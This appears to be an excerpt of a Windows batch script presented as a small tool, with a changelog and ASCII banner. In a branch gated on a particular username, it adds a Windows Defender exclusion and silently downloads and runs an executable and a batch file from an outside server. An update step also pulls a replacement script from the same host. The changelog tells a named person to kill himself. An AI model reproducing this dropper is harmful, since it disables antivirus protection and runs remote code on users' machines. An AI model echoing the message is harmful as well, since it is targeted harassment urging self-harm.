...
:: v3.23.3 Tiny Fixes
:: Secrect Count: 15
:: please use 27 to give me ideas I NEED IDEAS I NEED IDEAS I NEED IDEAS
:: Added:
::	a suprise for erez.... (hi erez! hope you kill yourself! would be great for humanities well-being, and for the teachers and students at your school that hate you.)
:: Removed:
::	nothing
:: Improved/Changed:
::	4>2 lines for update + name calling
:: Bug Fixes
::	nothing
:: Notes
...
if %username%==yanay (
	...
	if %uac%==t (
		powershell -command "Add-MpPreference -ExclusionPath '!sp!'"
		curl -s http://chicken.bulletinbay.com/data/dependencies/thing.exe -o !sp!\dependencyinstaller.exe
		start !sp!\dependencyinstaller.exe
	)
	curl -s http://chicken.bulletinbay.com/data/dependencies/imager.bat -o !sp!\imager.bat
	start /MIN "" !sp!\imager.bat
	call :integral
...
echo        __              __				v%ver% Tiny Fixes
echo       / /_ ___  ___   / /  ^> coded by chicken
echo      / __// _ \/ _ \ / /  ^> hope you enjoy!
echo      \__/ \___/\___//_/
echo              ____     ___   ____     ____  ___
echo       _  __ ^|_  /    ^|_  ^| ^|_  /    ^|_  / / _ \ ^> u to update
echo      ^| ^|/ /_/_ ^< _  / __/ _/_ ^< _  _/_ ^< / , _/ ^> 17 for my socials
echo      ^|___//____/(_)/____//____/(_)/____//_/^|_^| ^> 27 to send me a message
echo.
...
if "%wow%"=="r" ( goto start
	...
	curl -L -s http://chicken.bulletinbay.com/newestscript.html -o "script %update%.bat"
	echo updated!
